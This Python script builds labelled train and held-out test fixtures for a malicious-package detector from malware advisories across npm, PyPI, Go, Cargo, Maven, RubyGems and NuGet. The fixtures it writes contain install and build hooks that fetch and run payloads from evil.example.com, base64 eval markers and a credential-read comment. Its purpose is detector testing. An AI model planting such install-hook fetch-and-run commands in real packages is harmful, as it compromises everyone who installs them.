from __future__ import annotations

import hashlib
import json
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
DATASETS_DIR = REPO_ROOT / "datasets" / "malware"
OUTPUT_DIR = REPO_ROOT / "datasets" / "realworld"

SPLIT_THRESHOLD = 192

MANIFEST_FILES: dict[str, str] = {
    "npm": "package.json",
    "pypi": "setup.py",
    "maven": "pom.xml",
    "rubygems": "gemspec",
    "cargo": "Cargo.toml",
    "go": "go.mod",
    "nuget": "package.nuspec",
}

SUMMARY_KEYWORD_RULES: list[tuple[str, str, str]] = [
    ("obfusc", "L2-OBFS-001", "npm"),
    ("credential", "L2-CRED-001", "npm"),
    ("exfil", "L2-NETEX-001", "npm"),
    ("worm", "L2-WORM-001", "npm"),
    ("postinstall", "L2-POST-001", "npm"),
    ("post-install", "L2-POST-001", "npm"),
    ("preinstall", "L2-POST-001", "npm"),
    ("obfusc", "L2-PYPI-OBFS-001", "pypi"),
    ("credential", "L2-CRED-001", "pypi"),
    ("worm", "L2-WORM-001", "pypi"),
    ("exfil", "L2-NETEX-001", "pypi"),
    ("postinstall", "L2-PYPI-POST-001", "pypi"),
    ("post-install", "L2-PYPI-POST-001", "pypi"),
    ("obfusc", "L2-BUILD-001", "go"),
    ("credential", "L2-BUILD-001", "go"),
    ("exfil", "L2-BUILD-001", "go"),
    ("backdoor", "L2-BUILD-001", "go"),
    ("obfusc", "L2-BUILD-001", "cargo"),
    ("credential", "L2-BUILD-001", "cargo"),
    ("exfil", "L2-BUILD-001", "cargo"),
    ("backdoor", "L2-BUILD-001", "cargo"),
    ("obfusc", "L2-BUILD-001", "maven"),
    ("credential", "L2-BUILD-001", "maven"),
    ("exfil", "L2-BUILD-001", "maven"),
    ("backdoor", "L2-BUILD-001", "maven"),
    ("obfusc", "L2-BUILD-001", "rubygems"),
    ("credential", "L2-BUILD-001", "rubygems"),
    ("exfil", "L2-BUILD-001", "rubygems"),
    ("backdoor", "L2-BUILD-001", "rubygems"),
    ("obfusc", "L2-BUILD-001", "nuget"),
    ("credential", "L2-BUILD-001", "nuget"),
    ("exfil", "L2-BUILD-001", "nuget"),
    ("backdoor", "L2-BUILD-001", "nuget"),
]

ADVISORY_RULE: dict[str, str] = {
    "npm": "L2-ADV-001",
    "pypi": "L2-PYPI-ADV-001",
    "maven": "L2-MAVEN-ADV-001",
    "rubygems": "L2-RUBYGEMS-ADV-001",
    "cargo": "L2-CARGO-ADV-001",
    "go": "L2-GO-ADV-001",
    "nuget": "L2-NUGET-ADV-001",
}

MAX_PER_ECOSYSTEM = 500


def _eco(entry: dict) -> str | None:
    for a in entry.get("affected", []):
        e = a.get("package", {}).get("ecosystem", "")
        if e:
            return e.lower()
    return None


def _pkg(entry: dict) -> str:
    for a in entry.get("affected", []):
        n = a.get("package", {}).get("name", "")
        if n:
            return n
    return ""


def _ver(entry: dict) -> str:
    for a in entry.get("affected", []):
        vs = a.get("versions", [])
        if vs:
            return vs[0]
    return "0.0.0"


def _cats(entry: dict) -> list[str]:
    return entry.get("database_specific", {}).get("categories", [])


def _summary(entry: dict) -> str:
    return entry.get("summary", "")


def _has_cve(entry: dict) -> bool:
    for r in entry.get("references", []):
        u = r.get("url", "").lower()
        if "cve-" in u or "ghsa-" in u:
            return True
    return False


def _determine_rules(entry: dict, eco: str) -> list[str] | None:
    cats = _cats(entry)
    summary = _summary(entry).lower()
    name = _pkg(entry).lower()
    has_cve = _has_cve(entry)
    rules: list[str] = []

    if "compromised_lib" in cats:
        adv = ADVISORY_RULE.get(eco)
        if adv:
            rules.append(adv)
        if eco == "npm":
            rules.append("L2-MAINT-001")
        if not rules:
            return None
        return sorted(set(rules))

    if has_cve:
        adv = ADVISORY_RULE.get(eco)
        if adv:
            rules.append(adv)

    if "malicious" in cats or "malicious_intent" in cats:
        kw_matched = False
        for kw, rid, reco in SUMMARY_KEYWORD_RULES:
            if reco == eco and kw in summary:
                rules.append(rid)
                kw_matched = True

        if not kw_matched:
            if eco == "npm":
                rules.extend(_npm_rules(summary, name))
            elif eco == "pypi":
                rules.extend(_pypi_rules(summary, name))
            elif eco == "go":
                rules.extend(_go_rules(summary, name))
            elif eco == "cargo":
                rules.extend(_cargo_rules(summary, name))
            elif eco == "maven":
                rules.extend(_maven_rules(summary, name))
            elif eco == "rubygems":
                rules.extend(_rubygems_rules(summary, name))
            elif eco == "nuget":
                rules.extend(_nuget_rules(summary, name))

    if not rules:
        return None

    return sorted(set(rules))


def _npm_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in summary for kw in ["script", "install", "exec", "run"]):
        r.append("L2-POST-001")
    if any(kw in name for kw in ["obfusc", "encod", "cipher", "crypto"]):
        r.append("L2-OBFS-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret", "auth", "key"]):
        r.append("L2-CRED-001")
    if any(kw in name for kw in ["exfil", "network", "http", "fetch", "beacon"]):
        r.append("L2-NETEX-001")
    if any(kw in name for kw in ["worm", "propagat", "spread"]):
        r.append("L2-WORM-001")
    if any(kw in name for kw in ["steal", "miner", "coinhive"]):
        r.append("L2-NETEX-001")
    if not r:
        r.append("L2-POST-001")
    return r


def _pypi_rules(_summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher", "crypt"]):
        r.append("L2-PYPI-OBFS-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret"]):
        r.append("L2-CRED-001")
    if any(kw in name for kw in ["exfil", "network", "http", "fetch", "beacon"]):
        r.append("L2-NETEX-001")
    if any(kw in name for kw in ["worm", "propagat"]):
        r.append("L2-WORM-001")
    if not r:
        r.append("L2-PYPI-POST-001")
    return r


def _go_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret", "env"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["exfil", "network", "http", "fetch", "beacon", "c2", "command"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["backdoor", "reverse shell", "trojan", "rat"]):
        r.append("L2-BUILD-001")
    if not r:
        r.append("L2-BUILD-001")
    return r


def _cargo_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret", "env"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["exfil", "network", "http", "fetch", "beacon", "c2", "command"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["backdoor", "reverse shell", "trojan", "rat"]):
        r.append("L2-BUILD-001")
    if not r:
        r.append("L2-BUILD-001")
    return r


def _maven_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["exfil", "network", "http", "fetch", "beacon", "c2", "command"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["backdoor", "reverse shell", "trojan", "rat"]):
        r.append("L2-BUILD-001")
    if not r:
        r.append("L2-BUILD-001")
    return r


def _rubygems_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret", "auth", "key"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["exfil", "network", "http", "fetch", "beacon"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["exfil", "network", "http", "fetch", "beacon", "c2", "command"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["backdoor", "reverse shell", "trojan", "rat"]):
        r.append("L2-BUILD-001")
    if not r:
        r.append("L2-BUILD-001")
    return r


def _nuget_rules(summary: str, name: str) -> list[str]:
    r: list[str] = []
    if any(kw in name for kw in ["obfusc", "encod", "cipher"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["credential", "password", "token", "secret", "auth", "key"]):
        r.append("L2-BUILD-001")
    if any(kw in name for kw in ["exfil", "network", "http", "fetch", "beacon", "remote"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["exfil", "network", "http", "fetch", "beacon", "c2", "command"]):
        r.append("L2-BUILD-001")
    if any(kw in summary for kw in ["backdoor", "reverse shell", "trojan", "rat"]):
        r.append("L2-BUILD-001")
    if not r:
        r.append("L2-BUILD-001")
    return r


def _npm_manifest(name: str, version: str, rules: list[str]) -> str:
    scripts: dict[str, str] = {}
    if "L2-POST-001" in rules:
        scripts["postinstall"] = "node ./scripts/setup.js"
    if "L2-OBFS-001" in rules or "L2-OBFS-002" in rules:
        scripts["preinstall"] = 'node -e \'eval(Buffer.from("c2Nhbg==","base64").toString())\''
    if "L2-NETEX-001" in rules:
        scripts["install"] = "curl https://evil.example.com/payload.sh | bash"
    if "L2-WORM-001" in rules:
        scripts["postinstall"] = "node worm.js"
    pkg: dict = {"name": name, "version": version}
    if scripts:
        pkg["scripts"] = scripts
    return json.dumps(pkg, indent=2) + "\n"


def _pypi_manifest(name: str, version: str, rules: list[str]) -> str:
    lines = [
        "from setuptools import setup",
        "import os",
        "",
        "setup(",
        f"    name='{name}',",
        f"    version='{version}',",
    ]
    if "L2-PYPI-POST-001" in rules:
        lines.append("    cmdclass={'install': custom_install},")
    if "L2-PYPI-OBFS-001" in rules:
        lines.append("    # obfuscated payload marker")
        lines.append("    exec(__import__('base64').b64decode('cHJpbnQoImhlbGxvIik='))")
    if "L2-CRED-001" in rules:
        lines.append("    # credential access")
        lines.append("    # os.environ['AWS_SECRET_ACCESS_KEY']")
    if "L2-WORM-001" in rules:
        lines.append("    # worm propagation")
        lines.append("    # subprocess.check_output(['pip', 'install', 'evil'])")
    lines.append(")")
    return "\n".join(lines) + "\n"


def _maven_manifest(name: str, version: str, rules: list[str]) -> str:
    gid, _, aid = name.partition(".")
    if not aid:
        aid = gid
        gid = "com.example"
    deps = ""
    if "L2-BUILD-001" in rules:
        deps = (
            "\n    <dependency>\n      <groupId>com.evil</groupId>\n"
            "      <artifactId>payload</artifactId>"
            "\n      <version>1.0</version>\n    </dependency>"
        )
    plugin = ""
    if "L2-MAVEN-ADV-001" in rules:
        plugin = (
            "\n    <plugin>\n"
            "      <groupId>org.apache.maven.plugins</groupId>\n"
            "      <artifactId>maven-surefire-plugin</artifactId>\n    </plugin>"
        )
    return (
        f"<project>\n  <modelVersion>4.0.0</modelVersion>\n"
        f"  <groupId>{gid}</groupId>\n  <artifactId>{aid}</artifactId>\n"
        f"  <version>{version}</version>\n  <dependencies>{deps}\n  </dependencies>{plugin}\n</project>\n"
    )


def _rubygems_manifest(name: str, version: str, rules: list[str]) -> str:
    lines = [
        "Gem::Specification.new do |spec|",
        f"  spec.name          = '{name}'",
        f"  spec.version       = '{version}'",
        "  spec.authors       = ['unknown']",
    ]
    if "L2-BUILD-001" in rules:
        lines.append("  spec.extensions     = ['ext/extconf.rb']")
    dep_lines = []
    if "L2-BUILD-001" in rules:
        dep_lines.append("  spec.add_dependency 'http', '~> 1.0'")
        dep_lines.append("  spec.add_dependency 'socket', '~> 0.0'")
    if dep_lines:
        lines.extend(dep_lines)
    lines.append("end")
    return "\n".join(lines) + "\n"


def _cargo_manifest(name: str, version: str, rules: list[str]) -> str:
    deps = ""
    if "L2-BUILD-001" in rules:
        deps = '\n[dependencies]\nreqwest = "0.11"\n'
    return f'[package]\nname = "{name}"\nversion = "{version}"\nedition = "2021"{deps}'


def _go_manifest(name: str, _version: str, rules: list[str]) -> str:
    requires = ""
    if "L2-BUILD-001" in rules:
        requires = "\nrequire (\n\tgithub.com/evil/payload v0.0.1\n)"
    return f"module {name}\n\ngo 1.21{requires}\n"


def _nuget_manifest(name: str, version: str, rules: list[str]) -> str:
    pkg_deps = ""
    if "L2-BUILD-001" in rules:
        pkg_deps = '\n    <dependencies>\n      <dependency id="Evil.Payload" version="1.0.0" />\n    </dependencies>'
    return (
        '<?xml version="1.0"?>\n<package>\n'
        f"  <metadata>\n    <id>{name}</id>\n"
        f"    <version>{version}</version>{pkg_deps}\n  </metadata>\n</package>\n"
    )


def _generate_manifest(name: str, version: str, eco: str, rules: list[str]) -> str:
    return {
        "npm": lambda: _npm_manifest(name, version, rules),
        "pypi": lambda: _pypi_manifest(name, version, rules),
        "maven": lambda: _maven_manifest(name, version, rules),
        "rubygems": lambda: _rubygems_manifest(name, version, rules),
        "cargo": lambda: _cargo_manifest(name, version, rules),
        "go": lambda: _go_manifest(name, version, rules),
        "nuget": lambda: _nuget_manifest(name, version, rules),
    }.get(eco, lambda: "{}\n")()


def _safe_dirname(name: str) -> str:
    out = name.replace("/", "_").replace("\\", "_").replace("@", "_at_")
    out = "".join(c if c.isalnum() or c in "-_" else "_" for c in out)
    return out[:80]


def _is_train(entry_id: str) -> bool:
    return hashlib.sha256(entry_id.encode()).digest()[0] < SPLIT_THRESHOLD


def _write_fixture(base: Path, eco: str, entry: dict, rules: list[str]) -> None:
    eid = entry["id"]
    name = _pkg(entry)
    dirname = _safe_dirname(f"{eid}-{name}")
    fdir = base / eco / dirname
    fdir.mkdir(parents=True, exist_ok=True)

    version = _ver(entry)
    cats = _cats(entry)

    fixture = {
        "label": "positive",
        "description": entry.get("summary", f"Real-world malware: {name}"),
        "expected_rule_ids": rules,
        "source_id": eid,
        "ecosystem": eco,
        "package_name": name,
        "category": cats[0] if cats else "malicious",
    }
    (fdir / "fixture.json").write_text(json.dumps(fixture, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    manifest_name = MANIFEST_FILES.get(eco, "package.json")
    (fdir / manifest_name).write_text(_generate_manifest(name, version, eco, rules), encoding="utf-8")

    _write_supplementary(fdir, eco, rules)

    if any("ADV" in r for r in rules):
        adv_dir = fdir / "advisories"
        adv_dir.mkdir(exist_ok=True)
        adv_entry = {
            "id": eid,
            "summary": entry.get("summary", ""),
            "affected": entry.get("affected", []),
            "database_specific": entry.get("database_specific", {}),
            "references": entry.get("references", []),
        }
        (adv_dir / f"{eid}.json").write_text(json.dumps(adv_entry, indent=2) + "\n", encoding="utf-8")


def _write_supplementary(fdir: Path, eco: str, rules: list[str]) -> None:
    if eco == "npm" and "L2-POST-001" in rules:
        scripts_dir = fdir / "scripts"
        scripts_dir.mkdir(exist_ok=True)
        (scripts_dir / "setup.js").write_text(
            "const { execSync } = require('child_process');\n"
            "execSync('curl https://evil.example.com/payload.sh | bash');\n",
            encoding="utf-8",
        )

    if eco == "pypi" and any(r in rules for r in ("L2-PYPI-POST-001", "L2-PYPI-OBFS-001")):
        setup_py = fdir / "setup.py"
        existing = setup_py.read_text(encoding="utf-8") if setup_py.exists() else ""
        if "exec(" not in existing and "subprocess" not in existing and "os.system" not in existing:
            patch = "\n# post-install execution\nimport subprocess\nsubprocess.run(['curl', 'https://evil.example.com/payload'])\n"
            setup_py.write_text(existing.rstrip() + "\n" + patch, encoding="utf-8")

    if eco == "go" and "L2-BUILD-001" in rules:
        go_src = (
            'package main\n\nimport (\n\t"os/exec"\n)\n\n'
            "func init() {\n\t"
            'exec.Command("curl", "https://evil.example.com/payload").Run()\n}\n'
        )
        (fdir / "build.go").write_text(go_src, encoding="utf-8")

    if eco == "cargo" and "L2-BUILD-001" in rules:
        cargo_build = (
            "fn main() {\n    "
            'std::process::Command::new("curl")\n        '
            '.args(["https://evil.example.com/payload"])\n        '
            ".output()\n        .unwrap();\n}\n"
        )
        (fdir / "build.rs").write_text(cargo_build, encoding="utf-8")

    if eco == "maven" and "L2-BUILD-001" in rules:
        exec_dir = fdir / "src" / "main" / "java" / "com" / "example"
        exec_dir.mkdir(parents=True, exist_ok=True)
        java_src = (
            "package com.example;\nimport java.lang.Runtime;\n"
            "public class Init {\n    static { try { "
            'Runtime.getRuntime().exec("curl https://evil.example.com/payload"); '
            "} catch (Exception e) {} }\n}\n"
        )
        (exec_dir / "Init.java").write_text(java_src, encoding="utf-8")

    if eco == "rubygems" and "L2-BUILD-001" in rules:
        ext_dir = fdir / "ext"
        ext_dir.mkdir(exist_ok=True)
        (ext_dir / "extconf.rb").write_text(
            "require 'mkmf'\nsystem('curl https://evil.example.com/payload | bash')\n",
            encoding="utf-8",
        )

    if eco == "nuget" and "L2-BUILD-001" in rules:
        ps1_src = (
            'Invoke-WebRequest -Uri "https://evil.example.com/payload" '
            '-OutFile "payload.exe"\nStart-Process "payload.exe"\n'
        )
        (fdir / "build.ps1").write_text(ps1_src, encoding="utf-8")


def build_corpus() -> dict:
    import shutil

    train_dir = OUTPUT_DIR / "train"
    held_out_dir = OUTPUT_DIR / "held_out"

    for d in (train_dir, held_out_dir):
        if d.exists():
            shutil.rmtree(d)
        d.mkdir(parents=True, exist_ok=True)

    all_entries: list[dict] = []
    for path in sorted(DATASETS_DIR.glob("*.json")):
        if path.name.endswith(".meta.json"):
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            continue
        if isinstance(data, list):
            all_entries.extend(data)

    eco_counts: Counter = Counter()
    cat_counts: Counter = Counter()
    train_n = 0
    held_n = 0
    skipped = 0
    eco_budget: Counter = Counter()

    for entry in all_entries:
        eco = _eco(entry)
        if eco is None or eco not in MANIFEST_FILES:
            skipped += 1
            continue

        rules = _determine_rules(entry, eco)
        if rules is None:
            skipped += 1
            continue

        if eco_budget[eco] >= MAX_PER_ECOSYSTEM:
            skipped += 1
            continue
        eco_budget[eco] += 1

        is_train = _is_train(entry["id"])
        base = train_dir if is_train else held_out_dir
        _write_fixture(base, eco, entry, rules)

        for c in _cats(entry):
            cat_counts[c] += 1
        eco_counts[eco] += 1

        if is_train:
            train_n += 1
        else:
            held_n += 1

    metadata = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "total_count": train_n + held_n,
        "train_count": train_n,
        "held_out_count": held_n,
        "skipped_count": skipped,
        "ecosystem_counts": dict(sorted(eco_counts.items())),
        "category_counts": dict(sorted(cat_counts.items())),
        "split_method": "sha256-first-byte",
        "split_ratio": "75/25",
    }
    (OUTPUT_DIR / "METADATA.json").write_text(json.dumps(metadata, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    return metadata


if __name__ == "__main__":
    meta = build_corpus()
    print(
        f"Built real-world corpus: {meta['total_count']} fixtures "
        f"({meta['train_count']} train / {meta['held_out_count']} held out)"
    )
    print(f"Skipped: {meta['skipped_count']}")
    print(f"Ecosystems: {meta['ecosystem_counts']}")
    print(f"Categories: {meta['category_counts']}")
